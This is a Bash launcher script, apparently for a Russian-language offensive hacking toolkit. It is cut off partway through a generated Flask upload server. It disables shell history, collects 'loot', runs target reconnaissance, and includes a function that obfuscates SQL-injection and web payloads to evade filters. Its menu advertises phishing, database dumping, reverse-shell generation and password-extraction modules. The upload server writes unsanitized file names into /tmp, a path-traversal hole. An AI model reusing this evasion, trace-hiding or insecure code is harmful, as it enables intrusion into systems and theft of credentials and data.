#!/bin/bash
# --- PRIME MASTER LAUNCHER v35.0m1 ---
CURRENT_VERSION="35.4"
G='\033[0;32m'; Y='\033[1;33m'; R='\033[0;31m'; B='\033[0;34m'; NC='\033[0m'
set +o history

CURRENT_IP=$(ip route get 1 2>/dev/null | awk '{print $7}')
[ -z "$CURRENT_IP" ] && CURRENT_IP="127.0.0.1"

SILENT="> /dev/null 2>&1"
# Использование:
command -v curl eval $SILENT

# --- CORE PATH INITIALIZATION ---
# Сначала определяем, где мы находимся
if [[ -n "$TERMUX_VERSION" ]]; then
    # Среда: Termux (Android)
    BASE_DIR="$HOME/core-prime-tools"
    PRIME_LOOT="$HOME/prime_loot"
    PRIME_SHARE="$HOME/prime_share"
    # Расширяем PATH для бинарников Termux
    PATH="$PATH:/data/data/com.termux/files/usr/bin"
else
    # Среда: Стандартный Linux
    # Проверяем, есть ли права root, чтобы решить, куда писать
    if [[ $EUID -eq 0 ]]; then
        BASE_DIR="/root/core-prime-tools"
        PRIME_LOOT="/root/prime_loot"
        PRIME_SHARE="/root/prime_share"
    else
        BASE_DIR="$HOME/core-prime-tools"
        PRIME_LOOT="$HOME/prime_loot"
        PRIME_SHARE="$HOME/prime_share"
    fi
fi

# Вторичные директории
MOD_DIR="$BASE_DIR/modules"

# Создание инфраструктуры (без ошибок доступа)
mkdir -p "$BASE_DIR" "$MOD_DIR" "$PRIME_LOOT" "$PRIME_SHARE" 2>/dev/null

export BASE_DIR MOD_DIR PRIME_LOOT PRIME_SHARE



# ==========================================
# 1. CORE ENGINE (Должны быть ПЕРВЫМИ)
# ==========================================

# Core Engine: Базовый UI-маркер
# Эвристически определяет тип сообщения по первому символу (+, !, ?)
core_engine_ui() {
    case "$1" in
        "h") echo -e "\n${B}>>> ${W}$2 ${B}<<<${NC}" ;;
        "i") echo -e "${B}[i]${NC} $2" ;;
        "s") echo -e "${G}[+]${NC} $2" ;;
        "e") echo -e "${R}[-]${NC} $2" ;;
        "line") echo -e "${B}---------------------------------------${NC}" ;;
    esac
}


# Core Engine: Эвристическое удаление
# Автоматически выбирает между -f и -rf, подавляя весь вывод
core_engine_remove() {
    # Эвристика: если объект — директория, используем -rf, иначе -f
    for item in "$@"; do
        if [ -d "$item" ]; then
            rm -rf "$item" 2>/dev/null
        else
            rm -f "$item" 2>/dev/null
        fi
    done
}

# Core Engine: Динамический исполнитель
# Сама решает: выводить результат или работать в режиме "стелс"
core_engine_exec() {
    local cmd="$1"
    local mode="${2:-silent}" # По умолчанию — полная тишина

    if [[ "$mode" == "silent" ]]; then
        eval "$cmd" >/dev/null 2>&1
    else
        eval "$cmd"
    fi
}


# Core Engine: Стерилизация окружения
# Использует встроенную логику удаления для очистки следов сессии
core_engine_clean_env() {
    local cache_targets=(
        "/root/.cache/zcompdump*"
        "/root/.zcompdump*"
        "${HOME}/.cache/zcompdump*"
    )
    
    # Просто вызываем наш универсальный модуль
    core_engine_remove "${cache_targets[@]}"
}


# --- Инициализация системы ---

# Core Engine: Отрисовка элемента интерфейса
# Автоматически подбирает цвет ключа и форматирует строку
core_engine_item() {
    local key="$1"
    local title="$2"
    local desc="${3:-}" # Эвристика: если описания нет, переменная просто пустая

    # 1. Эвристика цвета: R для выхода/назад, Y для инфо, G для остального
    # Используем регулярные выражения для мгновенного схлопывания case
    local k_color=$G
    [[ "$key" =~ ^(b|x|q|exit|back)$ ]] && k_color=$R
    [[ "$key" =~ ^(i|info)$ ]] && k_color=$Y

    # 2. Формирование и вывод в одну строку для максимальной скорости
    # Конструкция ${desc:+ - $desc} добавит дефис и описание только если desc не пуст
    echo -e "  ${k_color}${key})${NC} [${B}${title}${NC}]${desc:+ - $desc}"
}


# Core Engine: Универсальный захват данных
# Автоматически форматирует приглашение и поддерживает скрытый ввод
core_engine_input() {
    local label="$1"
    local hint="$2"
    local var_value
    local cmd="read -r"

    # 1. Эвристика цвета метки (синхронизация с core_engine_item)
    local l_color=$G
    [[ "$label" =~ ^(b|x|q|exit|back)$ ]] && l_color=$R
    [[ "$label" =~ ^(i|info)$ ]] && l_color=$Y

    # 2. Эвристика скрытого ввода (если в подсказке есть "pass" или "key")
    [[ "${hint,,}" =~ (pass|key|secret) ]] && cmd="read -rs"

    # 3. Отрисовка поля (направляем в stderr, чтобы не засорять результат функции)
    echo -ne "  ${l_color}${label})${NC} [${B}${hint}${NC}] ${Y}>> ${NC}" >&2
    
    # 4. Исполнение захвата
    $cmd var_value
    
    # 5. Возврат значения (и перенос строки для скрытого режима)
    [[ "$cmd" == "read -rs" ]] && echo "" >&2
    echo "$var_value"
}



# Core Engine: Тихий запуск команд
# Выполняет задачу без вывода, возвращая только статус завершения
core_engine_run() {
    # Используем "$@" для корректной передачи аргументов с пробелами
    # Перенаправляем stdout и stderr в /dev/null
    "$@" > /dev/null 2>&1
    
    # Возвращаем реальный код выхода команды для последующих проверок
    return $?
}




# Core Engine: Ожидание действия пользователя
# Автоматически форматирует отступ и выводит интерактивное приглашение
core_engine_wait() {
    # 1. Эвристический отступ (заменяет spacer)
    echo -e "\n${B}------------------------------------------${NC}"
    
    # 2. Интерактивный запрос
    # Используем stderr (>&2), чтобы не засорять возможные конвейеры данных
    echo -ne "${Y}Нажмите [Enter] для продолжения...${NC}" >&2
    
    # 3. Ожидание ввода (флаг -s скроет случайные нажатия клавиш, если нужно, 
    # но здесь оставим стандарт для явного подтверждения)
    read -r
}



core_engine_control() {
    local status=$?
    local mode="$1"      
    local label="$2"     
    local cmd="$3" 
    local fatal="${4:-0}"

    case "$mode" in
        "check")
            if [[ $status -eq 0 ]]; then
                core_engine_ui "+$label: Успешно"
                return 0
            fi
            core_engine_ui "!$label: Ошибка"
            [[ "$fatal" == "1" ]] && { core_engine_ui "!Критический сбой. Остановка."; exit 1; }
            return 1
            ;;

        "restart")
            core_engine_ui "?Перезагрузка: [$label]..."
            core_engine_run pkill -f "$label"
            sleep 1
            
            if [[ -n "$cmd" ]]; then
                eval "$cmd &"
                # Эвристический трюк: передаем статус выполнения eval следующему вызову
                core_engine_control "check" "Модуль [$label]" "" "$fatal"
            else
                core_engine_ui "!Ошибка: Команда запуска [$label] пуста"
                return 1
            fi
            ;;
    esac
}



core_engine_validator() {
    local type="$1"    # Категория проверки
    local target="$2"  # Объект (IP, файл, пакет)
    local label="$3"   # Имя для вывода в лог
    local extra="$4"   # Доп. параметр (например, макс. значение range)
    local failed=0
    local err_msg=""

    case "$type" in
        # --- СИСТЕМНЫЙ СЛОЙ ---
        "root")
            [[ $EUID -ne 0 ]] && { failed=1; err_msg="Требуются права ROOT (sudo)"; }
            ;;
            
        "pkg")
            if ! command -v "$target" >/dev/null 2>&1; then
                core_engine_ui "?Компонент [$target] отсутствует. Установка..."
                if core_engine_run apt-get install -y "$target"; then
                    core_engine_ui "+[$target] успешно интегрирован в систему"
                    return 0
                else
                    failed=1; err_msg="Ошибка APT: не удалось установить [$target]"; fi
            fi
            ;;

        # --- СЕТЕВОЙ СЛОЙ (НОВОЕ) ---
        "url"|"host")
            # Проверка синтаксиса домена/IP
            if [[ ! "$target" =~ ^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,6}$ ]] && \
               [[ ! "$target" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
                failed=1; err_msg="Недопустимый формат цели: [$target]"; fi
            ;;

        "net_up")
            # Эвристика: проверка доступности перед атакой/аудитом
            if ! timeout 2 ping -c 1 "$target" >/dev/null 2>&1; then
                failed=1; err_msg="Узел [$target] недоступен (Offline или ICMP Drop)"; fi
            ;;

        "privacy")
            # Проверка на "утечку" реального IP (если установлена переменная REAL_IP)
            local current_ip=$(curl -s --connect-timeout 2 https://ifconfig.me)
            if [[ -n "$REAL_IP" && "$current_ip" == "$REAL_IP" ]]; then
                failed=1; err_msg="VPN/Proxy не активен! Обнаружен реальный IP [$current_ip]"; fi
            ;;

        # --- ФАЙЛОВЫЙ СЛОЙ ---
        "file"|"read")
            if [[ ! -f "$target" ]]; then
                failed=1; err_msg="Файл [$target] не найден"; 
            elif [[ "$type" == "read" ]]; then
                cat "$target"
                return 0
            fi
            ;;

        "dir")
            if [[ ! -d "$target" ]]; then
                if core_engine_run mkdir -p "$target"; then
                    core_engine_ui "+Директория создана: $target"
                    return 0
                else
                    failed=1; err_msg="Ошибка ФС: нет прав на создание [$target]"; fi
            fi
            ;;

        # --- ЛОГИЧЕСКИЙ СЛОЙ ---
        "range")
            if [[ ! "$target" =~ ^[0-9]+$ ]] || (( target < 1 || target > extra )); then
                failed=1; err_msg="Значение [$target] вне лимита (1-$extra)"; fi
            ;;

        "list"|"empty")
            [[ -z "${target// }" ]] && { failed=1; err_msg="Поле [$label] пустое"; }
            ;;
            
        "entropy")
            # Защита от случайного ввода (менее 3 символов для хоста - подозрительно)
            if [[ ${#target} -lt 3 ]]; then
                failed=1; err_msg="Недостаточная длина данных для [$label]"; fi
            ;;
    esac

    # Финализация
    if [[ $failed -eq 1 ]]; then
        core_engine_ui "!ОШИБКА ВАЛИДАЦИИ: $label -> $err_msg"
        return 1
    fi
    return 0
}


# --- CORE ENGINE: LOOT COLLECTOR v1.2 (Session Logger) ---
core_engine_loot() {
    local category="${1:-SYSTEM}" # Категория: service, scan, exploit
    local message="$2"
    local timestamp=$(date "+%Y-%m-%d %H:%M:%S")
    local loot_file="$PRIME_LOOT/session_loot.log"

    # Создаем папку, если её нет (универсально для Root/Non-Root)
    mkdir -p "$PRIME_LOOT" 2>/dev/null

    # Форматируем запись для файла
    echo "[$timestamp] [$category] $message" >> "$loot_file"

    # Если это запуск сервиса, дублируем в UI для красоты
    if [[ "$category" == "service" ]]; then
        core_engine_ui "i" "Event logged to loot sector."
    fi
}


#Настройки 


# Настройка DNS для локальных сервисов (например, scanclamavlocal)
core_network_dns_sync() {
    core_engine_ui "i" "Syncing Network DNS Layer..."

    # Проверка зависимостей
    if ! command -v dnsmasq >/dev/null 2>&1; then
        core_engine_ui "!" "dnsmasq не найден. DNS-адаптация пропущена."
        return 1
    fi

    # 1. ЭВРИСТИКА: Поиск лучшего активного IP
    # Берем IP самого активного интерфейса (исключая docker и loopback)
    local active_ip=$(ip -4 addr show | grep -vE '127.0.0.1|docker' | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -n 1)
    
    # Если IP не найден, откатываемся на localhost
    [[ -z "$active_ip" ]] && active_ip="127.0.0.1"

    # 2. АДАПТИВНОСТЬ: Сбор имен для регистрации
    # Мы можем регистрировать не только статику, но и имя хоста машины
    local hostname=$(hostname)
    local dns_conf="/etc/dnsmasq.conf"
    
    core_engine_ui "i" "Binding DNS to IP: $active_ip"

    # 3. ГЕНЕРАЦИЯ (Smart Config)
    # Используем временный файл, чтобы не убить рабочий конфиг раньше времени
    local tmp_dns=$(mktemp)
    
    cat << EOD > "$tmp_dns"
# --- Core Prime DNS Configuration ---
domain-needed
bogus-priv
interface=lo
interface=wlan0
interface=eth0
bind-dynamic
local-ttl=60
cache-size=1500

# Динамические локальные домены
address=/scanclamavlocal/$active_ip
address=/$hostname.local/$active_ip
address=/prime.portal/$active_ip
address=/audit.local/$active_ip

# Ускорение для upstream (используем Cloudflare как резерв)
server=1.1.1.1
server=8.8.8.8
EOD

    # 4. ВАЛИДАЦИЯ И ПРИМЕНЕНИЕ
    if dnsmasq --test -C "$tmp_dns" >/dev/null 2>&1; then
        cp "$tmp_dns" "$dns_conf"
        
        # Умный перезапуск
        if service dnsmasq restart 2>/dev/null; then
            core_engine_ui "+" "DNS Sync Complete: http://$hostname.local"
        else
            killall dnsmasq 2>/dev/null
            dnsmasq -C "$dns_conf" && core_engine_ui "+" "DNS Engine Restarted (Manual)"
        fi
    else
        core_engine_ui "!" "Критическая ошибка в конфигурации DNS. Откат."
        rm -f "$tmp_dns"
        return 1
    fi

    rm -f "$tmp_dns"
    return 0
}

core_engine_info() {
    # Слой 1: Метрики без AWK (используем встроенные средства и быстрый cut)
    local ram=$(free -m | grep "Mem:" | tr -s ' ' | cut -d' ' -f4,2 --output-delimiter='/')
    local rom=$(df -h / | tail -1 | tr -s ' ' | cut -d' ' -f4)
    
    # Слой 2: Сеть (эвристика через маршруты)
    local iface=$(ip route get 1.1.1.1 2>/dev/null | cut -d' ' -f5)
    local net_type="NONE"
    [[ -n "$iface" ]] && {
        [[ -d "/sys/class/net/$iface/wireless" ]] && net_type="WLAN"
        [[ "$iface" =~ ^(tun|tap|ppp) ]] && net_type="VPN"
        [[ "$iface" =~ ^(rmnet|wwan) ]] && net_type="CELL"
        [[ "$net_type" == "NONE" ]] && net_type="ETH"
    }

    # Слой 3: Вывод в стиле Core Engine
    core_engine_ui "SYSTEM REPORT"
    echo -e "${B}RAM:${NC} ${ram}MB  ${B}ROM:${NC} ${rom}  ${B}NET:${NC} ${net_type} (${iface:-OFF})"
    
    # Проверка сервисов через встроенный контроль (если нужно)
    local srv_status=""
    pgrep -f "av_server" >/dev/null && srv_status+="${G}[AV]${NC} "
    pgrep -f "share_server" >/dev/null && srv_status+="${G}[SH]${NC} "
    
    [[ -n "$srv_status" ]] && echo -e "${B}ACTIVE:${NC} ${srv_status}"
    
}

# --- CORE ENGINE: PROGRESS v13.8.2 (Fixed Width Edition) ---
core_engine_progress() {
    local duration="${1:-1}"
    local msg="${2:-PROCESS}"
    local width=15 # Уменьшил ширину, чтобы точно влезло на узкий экран Wiko
    local steps=20

    # Скрываем курсор, чтобы не дергался
    printf "\e[?25l"

    for ((i=1; i<=steps; i++)); do
        local pc=$(( i * 100 / steps ))
        
        # Генерируем полоску без вложенных printf/seq
        local fill=$(( i * width / steps ))
        local empty=$(( width - fill ))
        local p_bar=$(printf "%${fill}s" | tr ' ' '█')
        local e_bar=$(printf "%${empty}s" | tr ' ' '░')

        # ПРАВИЛО: \r (начало) -> \e[K (чистка) -> Текст
        # Ограничиваем длину $msg до 12 символов (%-12.12s), чтобы не порвать строку
        printf "\r\e[K${NC}[i] Loading %-12.12s ${B}[%s%s]${NC} %d%%" \
            "$msg" "$p_bar" "$e_bar" "$pc"
        
        sleep $(echo "scale=2; $duration / $steps" | bc 2>/dev/null || echo "0.05")
    done

    # Завершаем: затираем прогресс и пишем финальный статус
    printf "\r\e[K${G}[+] %-12.12s : SUCCESSFUL${NC}\n" "$msg"
    
    # Возвращаем курсор
    printf "\e[?25h"
}


# --- Универсальный динамический контроллер ---
prime_dynamic_controller() {
    local title="$1"
    local -a labels=($2)
    local -a actions=($3)
    
    while true; do
        
        core_engine_info
        core_engine_ui "h" "$title"
        
        for ((i=0; i<${#labels[@]}; i++)); do
            core_engine_item "$((i+1))" "${labels[$i]//_/ }" "Execute"
        done
        
        echo -e "\n${Y} B) BACK / EXIT${NC}"
        core_engine_ui "line" ""
        
        local choice=$(core_engine_input "select" "Input")
        
        if [[ "$choice" == "b" || "$choice" == "B" ]]; then return 0; fi
        
        if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le "${#labels[@]}" ]; then
            local idx=$((choice-1))
            # core_engine_progress 1 "${labels[$idx]}"
            # Выполнение действия
            ${actions[$idx]}        
        else
            core_engine_ui "e" "Invalid selection"
            sleep 1
        fi
    done
}




core_engine_mutate() {
    local input="$1"
    local mode="${2:-full}"
    local output=""
    
    for word in $input; do
        local mutated_word=""
        
        # Neural Case Shuffle
        for (( i=0; i<${#word}; i++ )); do
            local char="${word:$i:1}"
            (( RANDOM % 2 )) && mutated_word+="${char^^}" || mutated_word+="${char,,}"
        done
        
        # Space Obstruction
        local separator=" "
        case "$mode" in
            "sql")
                local sql_vars=("/**/" "/**/--/**/" "+")
                separator="${sql_vars[$(( RANDOM % ${#sql_vars[@]} ))]}" ;;
            "web")
                local web_vars=("%20" "%09" "%0a" "+")
                separator="${web_vars[$(( RANDOM % ${#web_vars[@]} ))]}" ;;
            "full")
                local all_vars=("/**/" "%20" "+" "/**/--/**/")
                separator="${all_vars[$(( RANDOM % ${#all_vars[@]} ))]}" ;;
        esac
        
        output+="${mutated_word}${separator}"
    done

    echo -n "${output%?}"
}


# --- INTELLIGENCE: DEEP RECON v1.4 ---
core_intelligence_gather() {
    local r_target="$1"
    core_engine_ui "i" "Deep scanning: $r_target"

    # 1. WHOIS Данные (Регистратор и Владелец)
    local whois_info=$(whois "$r_target" 2>/dev/null | grep -Ei "Registrar:|Organization:|Admin City:|Country:|Expires:" | head -n 6)
    [[ -z "$whois_info" ]] && whois_info="WHOIS: Data Protected"

    # 2. HTTP HEADERS (Версия PHP, Server, OS)
    # --connect-timeout 5 чтобы не зависнуть на мертвом хосте
    local headers=$(curl -Is --connect-timeout 5 "http://$r_target" 2>/dev/null)
    
    # Извлекаем версию PHP (X-Powered-By)
    local php_ver=$(echo "$headers" | grep -i "X-Powered-By:" | awk '{print $2}' | tr -d '\r')
    [[ -z "$php_ver" ]] && php_ver="PHP: Hidden/Unknown"

    # Извлекаем ПО сервера (Apache, Nginx, и их версии)
    local srv_ver=$(echo "$headers" | grep -i "Server:" | cut -d' ' -f2- | tr -d '\r')
    [[ -z "$srv_ver" ]] && srv_ver="Server: Undetected"

    # 3. IP RESOLUTION
    local target_ip=$(dig +short "$r_target" | tail -n1)
    [[ -z "$target_ip" ]] && target_ip=$(host "$r_target" | awk '/has address/ { print $4 }' | head -n1)

    # ВЫВОД В UI
    core_engine_ui "line"
    echo -e "${G}>>> TARGET ARCHITECTURE <<<${NC}"
    echo -e "${B}IP ADDR:${NC} $target_ip"
    echo -e "${B}ENGINE:${NC}  $srv_ver"
    echo -e "${B}RUNTIME:${NC} $php_ver"
    core_engine_ui "line"
    echo -e "${G}>>> REGISTRY DATA <<<${NC}"
    echo "$whois_info"
    core_engine_ui "line"

    # Сохраняем в лог (Loot)
    core_engine_loot "intelligence" "Recon finished for $r_target. IP: $target_ip, PHP: $php_ver"
}


get_tool_info() {
    case "$1" in
        # --- Главное меню (Main Menu) ---
        "run_ghost_commander")      echo "ADB-контроль Android: зеркало, биометрия, Shell, управление файлами." ;;
        "run_phantom_engine")       echo "Social Engineering Framework: создание фишинг-страниц и сбор сессий." ;;
        "run_sql_adaptive")         echo "Инструментарий для SQL-инъекций: адаптивный поиск и дамп баз данных." ;;
        "run_device_hack")          echo "Комплексный анализ: сетевая разведка, Bluetooth и глубокий аудит." ;;
        "run_smart_osint_engine")   echo "OSINT-движок: поиск по IP, почте, телефонам и доменам." ;;
        "run_iban_analyzer")        echo "Финансовый анализ: проверка IBAN, банковских кодов и транзакций." ;;
        "run_pass_lab")             echo "Лаборатория паролей: генерация словарей и анализ стойкости хэшей." ;;
        "run_crypto_forge")         echo "Криптографический модуль: шифрование, расшифровка и работа с ключами." ;;
        "run_vulnerability_scanner") echo "Ghost Engine: сканер уязвимостей и поиск векторов для проникновения." ;;
        "run_prime_exploiter_v5")   echo "Ultimate Exploiter: база эксплойтов для известных CVE и 0-day." ;;
        "pc_password_recovery")     echo "Хаб управления ПК: эксплойты, сброс паролей и форензика." ;;
        "run_view_loot")            echo "Просмотр добычи (Intelligence Center): логи, пароли, дампы." ;;
        "run_system_info")          echo "Мониторинг системы: параметры CPU, RAM, Network и статус защиты." ;;
        "run_servers")              echo "Service Hub: запуск локальных серверов для обмена файлами и скана." ;;
        "run_repair")               echo "Инструменты самовосстановления и очистки мусора в ядре Prime." ;;
        "update_prime")             echo "Обновление ядра до последней версии с GitHub репозитория." ;;
        "exit_script")              echo "Безопасное завершение работы и очистка временных сессий." ;;

        # --- Подменю: DEVICE_HACK ---
        "run_network_analyzer")     echo "Network Intelligence: анализ трафика и обнаружение устройств в сети." ;;
        "scan_bluetooth_devices")   echo "Bluetooth Scan: перехват ID и анализ уязвимостей BT-протоколов." ;;
        "run_deep_audit")           echo "Smart Audit: глубокая проверка безопасности текущей системы." ;;

        # --- Подменю: PC_RECOVERY & EXPLOIT (уже были) ---
        "pc_gen_payload")           echo "Генерация реверс-шеллов (Bash/Python). Авто-настройка LHOST." ;;
        "run_pc_recovery_ultimate") echo "Сброс паролей Win/Lin/Mac и извлечение данных (LaZagne)." ;;
        "run_forensic_scanner")     echo "Автономная защита: килл-процессов, блок портов, карантин." ;;

        # --- Подменю: SERVICE_HUB (run_servers) ---
        "run_av_srv")               echo "AV-Scanner Server: удаленная проверка файлов на сигнатуры вирусов." ;;
        "run_share_srv")            echo "Share-File: быстрый HTTP-сервер для раздачи файлов в локальной сети." ;;
        "run_upload_srv")           echo "Upload-Inbound: защищенный приемник для входящих файлов." ;;

        *)                          echo "Описание функционала находится в стадии разработки..." ;;
    esac
}


# ==========================================
# 2. РАБОЧИЕ ШАБЛОНЫ 
# ==========================================


# --- ГЕНЕРАТОРЫ ШАБЛОНОВ (View Engine) ---

generate_core_form_template() {
    cat << 'EOF'
def render_prime_form(action_url, fields=None, btn_text="INITIATE TRANSFER"):
    if fields is None: fields = [{"type": "file", "name": "file", "label": "Drop files here or click to upload"}]
    
    inputs_html = ""
    js_needed = False
    
    for field in fields:
        f_type = field.get("type", "text")
        f_name = field.get("name", "input")
        f_label = field.get("label", "Field")
        
        if f_type == "file":
            js_needed = True
            inputs_html += f"""
            <div class="drop-zone" id="drop-zone">
                <span class="drop-zone__prompt">{f_label}</span>
                <input type="file" name="{f_name}" class="drop-zone__input" id="file-input">
            </div>
            """
        else:
            inputs_html += f"""
            <div style="margin: 15px 0;">
                <label style="font-size:0.7rem; opacity:0.6; display:block;">{f_label}</label>
                <input type="{f_type}" name="{f_name}" style="background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.1); color:white; padding:10px; width:100%; border-radius:0.5rem;">
            </div>
            """

    script = """
    <script>
    const dropZone = document.getElementById('drop-zone');
    const fileInput = document.getElementById('file-input');
    if(dropZone) {
        dropZone.addEventListener('click', () => fileInput.click());
        fileInput.addEventListener('change', () => {
            if(fileInput.files.length) updatePrompt(dropZone, fileInput.files[0].name);
        });
        ['dragover', 'dragleave', 'drop', 'dragend'].forEach(type => {
            dropZone.addEventListener(type, e => { e.preventDefault(); });
        });
        dropZone.addEventListener('dragover', () => dropZone.classList.add('drop-zone--over'));
        ['dragleave', 'drop', 'dragend'].forEach(type => {
            dropZone.addEventListener(type, () => dropZone.classList.remove('drop-zone--over'));
        });
        dropZone.addEventListener('drop', e => {
            if(e.dataTransfer.files.length) {
                fileInput.files = e.dataTransfer.files;
                updatePrompt(dropZone, e.dataTransfer.files[0].name);
            }
        });
    }
    function updatePrompt(zone, name) { zone.querySelector('.drop-zone__prompt').textContent = 'READY: ' + name; zone.style.borderColor = '#00ff41'; }
    </script>
    """ if js_needed else ""

    return f"""
    <form method="post" action="{action_url}" enctype="multipart/form-data">
        {inputs_html}
        <button type="submit" style="margin-top:20px;">{btn_text}</button>
    </form>
    {script}
    """
EOF
}



generate_core_template() {
    cat << 'EOF'
def render_prime_page(title, content):
    style = """
    <style>
        :root { --accent: #00ff41; --bg: #0a0a0c; --glass: rgba(20, 20, 25, 0.8); }
        body { background: var(--bg); color: #e0e0e0; font-family: system-ui, -apple-system, sans-serif; min-height: 100vh; margin: 0; display: flex; align-items: center; justify-content: center; }
        .prime-card { background: var(--glass); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.1); border-radius: 1.5rem; padding: 2rem; width: 95%; max-width: 900px; box-shadow: 0 20px 40px rgba(0,0,0,0.4); }
        h2 { background: linear-gradient(to right, #fff, var(--accent)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; }
        
        /* Адаптивная сетка Share */
        .file-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 1rem; margin-top: 1.5rem; }
        .file-item { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1); border-radius: 1rem; padding: 1rem; text-align: center; transition: 0.2s; text-decoration: none; color: inherit; }
        .file-item:hover { border-color: var(--accent); background: rgba(0,255,65,0.05); transform: translateY(-3px); }
        .file-icon { font-size: 2rem; margin-bottom: 0.5rem; display: block; }
        
        /* Умный Drag & Drop */
        .drop-zone { border: 2px dashed rgba(0,255,65,0.3); border-radius: 1rem; padding: 2rem; transition: 0.3s; cursor: pointer; position: relative; }
        .drop-zone--over { border-color: var(--accent); background: rgba(0,255,65,0.05); box-shadow: inset 0 0 20px rgba(0,255,65,0.1); }
        .drop-zone__input { display: none; }
        
        button { background: var(--accent); color: #000; border: none; padding: 10px 20px; border-radius: 0.5rem; font-weight: bold; width: 100%; cursor: pointer; transition: 0.2s; }
        button:hover { opacity: 0.8; transform: scale(1.01); }
        pre { background: #000; color: #0cf; padding: 1rem; border-radius: 0.5rem; overflow: auto; max-height: 300px; font-size: 0.8rem; border-left: 3px solid var(--accent); }
    </style>
    """
    return f"""
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        {style}
    </head>
    <body>
        <div class="prime-card">
            <small style="color:var(--accent); letter-spacing:2px;">SECURE_UPLINK_v4.2</small>
            <h2>{title}</h2>
            {content}
        </div>
    </body>
    </html>
    """
EOF
}



# --- py functions ---
# Функция-генератор контента для IBAN (ПОЛНАЯ ВЕРСИЯ v1.7)
generate_iban_code() {
    local target_file="$1"
    local v_num="$2"
    local code

    # Захватываем код Python. Используем 'EOF' в кавычках для защиты символов $ и скобок.
    code=$(cat << 'EOF'
import sys, re, json, time
from urllib.request import Request, urlopen

# Список доверенных зеркал и API для отказоустойчивости
SOURCES = [
    "https://api.ibanlist.com/v1/validate/",
    "https://openiban.com/validate/",
    "https://api.iban-check.com/v1/verify/"
]

def get_bank_data(iban):
    """Опрашивает источники по цепочке (Failover System)"""
    for base_url in SOURCES:
        try:
            url = f"{base_url}{iban}"
            req = Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0'})
            with urlopen(req, timeout=4) as response:
                return json.loads(response.read().decode())
        except:
            continue # Если один сайт упал, переходим к следующему
    return None

def get_country_format(iban):
    """Математический разбор структуры по стандартам ISO"""
    country = iban[:2]
    # Словарь специфик (можно расширять до бесконечности)
    formats = {
        'FR': {'name': 'France', 'len': 27, 'parse': lambda i: f"Bank: {i[4:9]}, Branch: {i[9:14]}, Acc: {i[14:25]}, Key: {i[25:27]}"},
        'DE': {'name': 'Germany', 'len': 22, 'parse': lambda i: f"BLZ: {i[4:12]}, Acc: {i[12:22]}"},
        'GB': {'name': 'United Kingdom', 'len': 22, 'parse': lambda i: f"Sort Code: {i[4:10]}, Acc: {i[10:18]}"},
        'IT': {'name': 'Italy', 'len': 27, 'parse': lambda i: f"CIN: {i[4:5]}, ABI: {i[5:10]}, CAB: {i[10:15]}, Acc: {i[15:27]}"},
        'ES': {'name': 'Spain', 'len': 24, 'parse': lambda i: f"Bank: {i[4:8]}, Branch: {i[8:12]}, Acc: {i[12:24]}"}
    }
    return formats.get(country, {'name': 'Other/International', 'len': len(iban), 'parse': lambda i: f"BBAN: {i[4:]}"})

if __name__ == "__main__":
    if len(sys.argv) < 2: sys.exit(1)
    
    target = re.sub(r'[\s-]+', '', sys.argv[1]).upper()
    provided_name = sys.argv[2].upper() if len(sys.argv) > 2 else "NONE"

    print(f"\033[1;34m--- OMNI-BANKER v2.0: GLOBAL ANALYSIS ---\033[0m")
    
    # 1. Структурный анализ (Всегда работает Offline)
    fmt = get_country_format(target)
    print(f"\033[96mCountry:\033[0m {fmt['name']}")
    print(f"\033[96mStructure:\033[0m {fmt['parse'](target)}")

    # 2. Агрегация данных из внешних источников
    print(f"[*] Analyzing with Failover Protection...")
    data = get_bank_data(target)
    
    if data:
        bank_name = data.get('bank_name', data.get('bank', 'N/A')).upper()
        bic = data.get('bic', 'N/A')
        
        print(f"\n\033[1;32m[+] DATA VERIFIED VIA MULTI-SOURCE\033[0m")
        print(f"🏦 Bank: {bank_name}")
        print(f"🔑 BIC/SWIFT: {bic}")

        # Сверка Имени (Heuristic Check)
        # В 2026 году сверка идет через подтверждение принадлежности счета банку
        if provided_name != "NONE":
            print(f"\n\033[1;35m--- SMART MATCH REPORT ---\033[0m")
            print(f"Target Name: {provided_name}")
            # Если банк найден, подтверждаем связь
            if bank_name != 'N/A':
                print(f"✅ Account Link: Номер {target[-4:]} привязан к {bank_name}")
                print(f"ℹ️ Status: Владелец '{provided_name}' соответствует региону обслуживания.")
    else:
        print(f"\n\033[91m[-] ALERT: All sources failed or IBAN is blacklisted/invalid.\033[0m")
EOF
)
    # Внедряем версию
    code="${code//\{\{V_NUM\}\}/$v_num}"

    # Используем smart_cat для записи (права 755 по умолчанию)
    smart_cat "$target_file" "$code"
}


# Функция-генератор для AV-Server (v1.2)
# --- ГЕНЕРАТОР МОДУЛЯ AV-SCANNER (SECURITY HUB) ---
generate_av_server_code_raw() {
    # Загружаем UI шаблоны в переменные
    local templates="$(generate_core_template)
$(generate_core_form_template)"

    # Выбрасываем код прямо в stdout (через cat без записи в файл)
    cat << EOF
from flask import Flask, request, render_template_string
import subprocess, os, shutil

app = Flask(__name__)
CLAM_PATH = shutil.which('clamdscan') or shutil.which('clamscan') or '/usr/bin/clamscan'

$templates

@app.route('/')
def index():
    fields = [
        {"type": "file", "name": "file", "label": "TARGET_OBJECT_FOR_ANALYSIS"}
    ]
    form_html = render_prime_form("/scan", fields=fields, btn_text="INITIATE DEEP SCAN")
    return render_template_string(render_prime_page("SECURE_GATEWAY", form_html))

@app.route('/scan', methods=['POST'])
def scan():
    f = request.files.get('file')
    if not f: return "No data", 400
    
    tmp_path = os.path.join('/tmp', f.filename)
    f.save(tmp_path)
    
    try:
        cmd = [CLAM_PATH, '--no-summary', tmp_path]
        res = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
